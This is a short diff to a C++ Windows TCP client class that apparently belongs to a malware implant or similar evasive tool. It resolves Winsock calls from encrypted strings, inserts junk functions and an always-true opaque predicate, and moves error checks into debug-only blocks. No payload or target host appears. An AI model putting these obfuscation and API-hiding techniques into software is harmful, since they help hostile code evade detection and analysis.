@@ -69,22 +69,30 @@ void TCPClient::send_data(std::string data)
 	uint32_t dataLenInNetworkOrder = resolve_dynamically<htonl_t>(str_htonl, str_ws2_32)(len);
 
 	int sendResult = resolve_dynamically<send_t>(str_send, str_ws2_32)(this->sock, reinterpret_cast<const char*>(&dataLenInNetworkOrder), sizeof(dataLenInNetworkOrder), 0);
+
+#ifdef _DEBUG
 	if (sendResult == SOCKET_ERROR)
 	{
 		//std::cerr << "Error sending length header, Err #" << resolve_dynamically<WSAGetLastError_t>("WSAGetLastError", string_decrypt_cstr(str_ws2_32, str_ws2_32_len))() << std::endl;
 		//return;
 	}
+#endif // _DEBUG
+
+	
 
 	int garbage = not_inlined_junk_func_3((int)data.capacity(), len, &sendResult) ^ 0x41;
 	if ((dummy ^ garbage) == not_inlined_junk_func_3((int)data.capacity(), len, &sendResult)) // Always true
 	{
 		// Now send the data itself
 		sendResult = resolve_dynamically<send_t>(str_send, str_ws2_32)(this->sock, data.c_str(), len, 0);
+
+#ifdef _DEBUG
 		if (sendResult == SOCKET_ERROR)
 		{
 			/*std::cerr << "Error sending data to server, Err #" << resolve_dynamically<WSAGetLastError_t>("WSAGetLastError", string_decrypt_cstr(str_ws2_32, str_ws2_32_len))() << std::endl;
 			return;*/
 		}
+#endif // _DEBUG
 	}
 }
 
@@ -111,9 +119,12 @@ std::string TCPClient::recv_data() {
 
 		// Receiving the actual buffer sent
 		int bytesReceived = resolve_dynamically<recv_t>(str_recv, str_ws2_32)(this->sock, &buf[0], bufLength, 0);
+#ifdef _DEBUG
 		if (bytesReceived == SOCKET_ERROR || bytesReceived != bufLength)
+		{
 			//std::cerr << "Error in recv(), Err #" << resolve_dynamically<WSAGetLastError_t>("WSAGetLastError", string_decrypt_cstr(str_ws2_32, str_ws2_32_len))() << std::endl;
-
+		}
+#endif // _DEBUG
 		return buf;
 	}
 	return std::string("");
